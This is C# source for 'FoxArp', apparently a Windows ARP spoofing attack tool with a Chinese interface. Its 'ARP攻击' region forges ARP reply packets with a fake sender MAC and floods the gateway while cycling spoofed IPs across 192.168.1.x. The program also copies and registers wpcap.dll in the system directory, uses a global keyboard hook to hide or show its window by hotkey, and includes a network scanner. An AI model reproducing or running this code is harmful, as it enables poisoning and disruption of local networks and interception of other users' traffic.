using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Text;
using System.Windows.Forms;
using Tamir.IPLib.Packets;
using Tamir.IPLib;
using Tamir.IPLib.Protocols;
using System.Threading;
using ActivityHook;
using System.IO;
using System.Net;


namespace FoxArp
{
    delegate void SetTextCallBack(string text);

    public partial class WinForm : Form
    {
        public WinForm()
        {
            InitializeComponent();
            // keyhook = new KeyboardHook();        

            // keyhook.KeyboardEvent += new KeyboardHook.KeyboardEventHandler(keyhook_KeyboardEvent);

            //keyhook.InstallHook();
            HookManager.KeyDown += new KeyEventHandler(HookManager_KeyDown);

        }

        public void GetNetWary()
        {
            System.Net.IPHostEntry myHost = new System.Net.IPHostEntry();
            myHost = System.Net.Dns.GetHostEntry(System.Net.Dns.GetHostName());
            for (int i = 0; i < myHost.AddressList.Length; i++)
            {
                Console.WriteLine(myHost.AddressList[i].ToString());

            }
        }

        protected override CreateParams CreateParams
        {
            get
            {
                int CS_NOCLOSE = 0x200;
                CreateParams parameters = base.CreateParams;
                parameters.ClassStyle |= CS_NOCLOSE;

                return parameters;
            }
        }
        private bool bolSendPacket = true;
        private bool bolGetDev = true;


        private void Form1_Load(object sender, EventArgs e)
        {
            try
            {

                PcapDeviceList devices = SharpPcap.GetAllDevices();
                for (int z = 0; z < devices.Count; z++)
                {

                    cbbDeviece.Items.Add(devices[z].PcapDescription);
                }

                cbbDeviece.SelectedIndex = 0;


            }
            catch (Exception ex)
            {
                MessageBox.Show("绑定网卡失败！");
                bolGetDev = false;
            }
        }

        #region ARP攻击
        private void CheckWpCap()
        {

            // MessageBox.Show(Environment.SystemDirectory);
            string FilePath = Environment.SystemDirectory + @"\wpcap.dll";
            if (!File.Exists(FilePath))
            {
                String PP = AppDomain.CurrentDomain.BaseDirectory + @"Lib\wpcap.dll";
                File.Copy(PP, FilePath);
                System.Diagnostics.Process.Start("Regsvr32 ", FilePath);
            }
        }
        Thread threadgetmac;
        private void btnGetGateWayMac_Click(object sender, EventArgs e)
        {
            try
            {
                if (!bolGetDev)
                {
                    MessageBox.Show("绑定网卡失败，无法完成"); return;
                }

                if (tbxGateWayIp.Text == "")
                {
                    MessageBox.Show("请输入网关IP"); return;
                }
                else
                {
                    System.Net.IPAddress.Parse(tbxGateWayIp.Text);
                    long z = Ipchange(tbxGateWayIp.Text);
                    string x = Ipchanged(z);
                    if (x != tbxGateWayIp.Text)
                    {
                        MessageBox.Show("请输入正确的网关IP"); return;
                    }
                }
            }
            catch (Exception se)
            {
                MessageBox.Show("请输入正确的网关IP"); return;
            }

            btnGetGateWayMac.Enabled = false;
            btnExit.Enabled = false;
            bolGetMacSuc = false;
            threadgetmac = new Thread(new ThreadStart(GetGatewayMac));
            threadgetmac.Start();
            Thread getmactimeout = new Thread(new ThreadStart(GetMacTimeOut));
            getmactimeout.Start();
        }

        private bool bolGetMacSuc = false;
        private void GetMacTimeOut()
        {
            Thread.Sleep(1000);
            if (!bolGetMacSuc)
            {
                threadgetmac.Abort();
                MessageBox.Show("获取网关MAC失败，请手动输入！");
            }
            else
            {
                MessageBox.Show("成功获取网关MAC！");
            }


            btnGetGateWayMac.Enabled = true;
            btnExit.Enabled = true;

        }

        private void GetGatewayMac()
        {
            try
            {
                PcapDeviceList deviece = SharpPcap.GetAllDevices();

                PcapDevice tempdevice = deviece[cbbDeviece.SelectedIndex];
                string name = deviece[cbbDeviece.SelectedIndex].PcapName;
                ARP A = new ARP(name);
                NetworkDevice dev = (NetworkDevice)tempdevice;
                A.LocalMAC = dev.MacAddress; ;
                A.LocalIP = dev.IpAddress; ;
                A.DeviceName = name;
                tbxGateWayMac.Text = A.Resolve(tbxGateWayIp.Text, name);
                bolGetMacSuc = true;
            }
            catch
            {

            }
        }

        private long Ipchange(string ipaddress)
        {
            int position1 = ipaddress.IndexOf(".");
            int position2 = ipaddress.IndexOf(".", position1 + 1);
            int position3 = ipaddress.IndexOf(".", position2 + 1);
            long[] ip = new long[4];
            ip[0] = long.Parse(ipaddress.Substring(0, position1));
            ip[1] = long.Parse(ipaddress.Substring(position1 + 1, position2 - position1 - 1));
            ip[2] = long.Parse(ipaddress.Substring(position2 + 1, position3 - position2 - 1));
            ip[3] = long.Parse(ipaddress.Substring(position3 + 1));
            return (ip[0] << 24) + (ip[1] << 16) + (ip[2] << 8) + (ip[3]);
        }
        private string strGateWayIp;
        private string strGateWayMac;
        private string strAttackIp;
        private string strSouMac = "00-E0-70-53-BF-E6";
        private int intSendSpeed;

        private string Ipchanged(long ipaddress)
        {
            string z = "";
            z = (ipaddress >> 24).ToString() + "." + ((ipaddress >> 16) & 0x000000FF).ToString() + "." + ((ipaddress >> 8) & 0x000000FF).ToString() + "." + (ipaddress & 0x000000FF).ToString();
            return z;
        }

        private void btnStart_Click(object sender, EventArgs e)
        {
            if (btnStart.Text == "开始")
            {
                if (!bolGetDev)
                {
                    MessageBox.Show("绑定网卡失败，无法完成"); return;
                }
                if (tbxGateWayIp.Text == "" || tbxGateWayMac.Text == "" || tbxAtackIp.Text == "")
                {
                    MessageBox.Show("IP或MAC不能为空"); return;
                }
                else
                {
                    try
                    {
                        System.Net.IPAddress.Parse(tbxGateWayIp.Text);
                        long z = Ipchange(tbxGateWayIp.Text);
                        string x = Ipchanged(z);
                        if (x != tbxGateWayIp.Text)
                        {
                            MessageBox.Show("请输入正确的IP"); return;
                        }
                        System.Net.IPAddress.Parse(tbxAtackIp.Text);
                        z = Ipchange(tbxAtackIp.Text);
                        x = Ipchanged(z);
                        if (x != tbxAtackIp.Text)
                        {
                            MessageBox.Show("请输入正确的IP"); return;
                        }
                    }
                    catch
                    {
                        MessageBox.Show("请输入正确的IP"); return;
                    }
                }

                strAttackIp = tbxAtackIp.Text;
                strGateWayIp = tbxGateWayIp.Text;
                strGateWayMac = tbxGateWayMac.Text;
                intSendSpeed = (int)nudSendSpeed.Value;


                bolSendPacket = true;
                btnExit.Enabled = false;
                tbxAtackIp.Enabled = false;
                tbxGateWayIp.Enabled = false;
                tbxGateWayMac.Enabled = false;
                nudSendSpeed.Enabled = false;
                cbbDeviece.Enabled = false;
                btnGetGateWayMac.Enabled = false;
                btnStart.Text = "停止";
                bgwArpSend.RunWorkerAsync();
            }
            else
            {

                bolSendPacket = false;
                bgwArpSend.CancelAsync();

            }
        }

        private void bgwArpSend_DoWork(object sender, DoWorkEventArgs e)
        {

            Thread a = new Thread(new ThreadStart(ArpPacketSend));
            a.Start();

            while (!bgwArpSend.CancellationPending)
            {
                Thread.Sleep(100);
            }

            setText("开始");

        }

        private void setText(string text)
        {
            // InvokeRequired需要比较调用线程ID和创建线程ID
            // 如果它们不相同则返回true
            if (this.btnStart.InvokeRequired)
            {
                SetTextCallBack d = new SetTextCallBack(setText);
                this.Invoke(d, new object[] { text });
            }
            else
            {
                this.btnStart.Text = "开始";
                btnStart.Enabled = true;
                btnExit.Enabled = true;
                tbxAtackIp.Enabled = true;
                tbxGateWayIp.Enabled = true;
                tbxGateWayMac.Enabled = true;
                nudSendSpeed.Enabled = true;
                cbbDeviece.Enabled = true;
                btnGetGateWayMac.Enabled = true;
            }
        }

        private void ArpPacketSend()
        {
            int xs = 0;

            try
            {
                PcapDeviceList devices = SharpPcap.GetAllDevices();

                PcapDevice device = devices[0];
                NetworkDevice dev = (NetworkDevice)device;

                int len = EthernetFields_Fields.ETH_HEADER_LEN;
                string destmac = strGateWayMac;
                byte[] bytes = new byte[60];
                ARPPacket arp = new ARPPacket(len, bytes);


                arp.SourceHwAddress = strSouMac;
                arp.DestinationHwAddress = destmac;        

                arp.EthernetProtocol = EthernetProtocols_Fields.ARP;

                arp.ARPHwType = 0x0001;
                arp.ARPProtocolType = 0x0800;
                arp.ARPHwLength = 6;
                arp.ARPProtocolLength = 4;
                arp.ARPOperation = 0x0002;


                arp.ARPSenderHwAddress = strSouMac;   //伪造攻击者的硬件地址
                arp.ARPSenderProtoAddress = strAttackIp;  //被攻击ip地址

                arp.ARPTargetHwAddress = destmac;          //目标硬件地址
                arp.ARPTargetProtoAddress = strGateWayIp;  //目标ip地址       

                int ppp = 2;

                while (bolSendPacket)
                {
                    dev.PcapOpen(true, 20);
                    //把arp的被攻击者的ip地址变一下

                    arp.ARPSenderProtoAddress = "192.168.1." + ppp;
                    if (ppp > 254)
                    {
                        ppp = 1;
                    }
                    ppp++;

                    dev.PcapSendPacket(arp);
                    dev.PcapClose();
                    xs++;


                    if (xs == intSendSpeed)
                    {
                        Thread.Sleep(1000);
                        xs = 0;
                    }
                }

            }
            catch
            {
                MessageBox.Show("发送失败！");
                bolSendPacket = false;
                bgwArpSend.CancelAsync();
            }

        }
        #endregion 
        private void btnExit_Click(object sender, EventArgs e)
        {
            this.Close();
        }

        private void btnCopyRight_Click(object sender, EventArgs e)
        {
            copyright cd = new copyright();
            cd.ShowDialog();
        }



        private void button1_Click(object sender, EventArgs e)
        {
            this.Hide();
        }


        int ShowKey = 123;
        int HideKey = 122;
        int tempShowKey = 123;
        int tempHideKey = 122;
        void HookManager_KeyDown(object sender, KeyEventArgs e)
        {
            if (e.KeyValue == ShowKey)
            {
                this.Show();
            }
            if (e.KeyValue == HideKey)
            {
                this.Hide();
            }
        }

        private void button2_Click(object sender, EventArgs e)
        {
            HideKey = tempHideKey;
            ShowKey = tempShowKey;
            button2.Enabled = false;
            MessageBox.Show("修改键位成功！");
        }

        #region 控制

        private void textBox_HideKey_KeyDown(object sender, KeyEventArgs e)
        {

            if (!e.Alt && !e.Control && !e.Shift && e.KeyValue != 20 && e.KeyValue != 91 && e.KeyValue != 8 && e.KeyValue != 13 && ShowKey != HideKey)
            {
                tempHideKey = e.KeyValue;
                textBox_HideKey.Text = e.KeyData.ToString();
            }
        }

        private void textBox_ShowKey_KeyDown(object sender, KeyEventArgs e)
        {

            if (!e.Alt && !e.Control && !e.Shift && e.KeyValue != 20 && e.KeyValue != 91 && e.KeyValue != 8 && e.KeyValue != 13 && ShowKey != HideKey)
            {
                tempShowKey = e.KeyValue;
                textBox_ShowKey.Text = e.KeyData.ToString();
            }

        }

        private void textBox_ShowKey_TextChanged(object sender, EventArgs e)
        {
            button2.Enabled = true;
        }

        private void textBox_HideKey_TextChanged(object sender, EventArgs e)
        {
            button2.Enabled = true;
        }

        private void nudSendSpeed_ValueChanged(object sender, EventArgs e)
        {
            if (nudSendSpeed.Value > 50)
            {
                nudSendSpeed.Value = 50;
            }
            if (nudSendSpeed.Value < 1)
            {
                nudSendSpeed.Value = 1;
            }
        }

        private void nudSendSpeed_KeyPress(object sender, KeyPressEventArgs e)
        {


            if ((e.KeyChar != '\b') && !Char.IsDigit(e.KeyChar))
            {
                e.Handled = true;
            }
        }

        private void tbxGateWayIp_KeyPress(object sender, KeyPressEventArgs e)
        {
            if (e.KeyChar != '\b')
                if ((e.KeyChar != '.') && !Char.IsDigit(e.KeyChar))
                {
                    e.Handled = true;
                }
        }
        #endregion

        bool isExpend = false;
        private void button3_Click(object sender, EventArgs e)
        {
            isExpend = !isExpend;
            if (isExpend)
            {

                this.Height = 594;
            }
            else
            {
                this.Height = 252;
            }
        }

        private void btn_ScanNet_Click(object sender, EventArgs e)
        {
            btn_ScanNet.Enabled = false;
            btn_ScanStop.Enabled = true;
            myContainer1.ClearItem();
            myContainer1.ScanNet(textBox_IP.Text, "1", "10");

            btn_ScanNet.Enabled = true;
            btn_ScanStop.Enabled = false;
        }

        private void btn_ScanStop_Click(object sender, EventArgs e)
        {
            myContainer1.ScanStop();
            btn_ScanNet.Enabled = true;
            btn_ScanStop.Enabled = false;
        }


        int HostIP = 1;





    }
}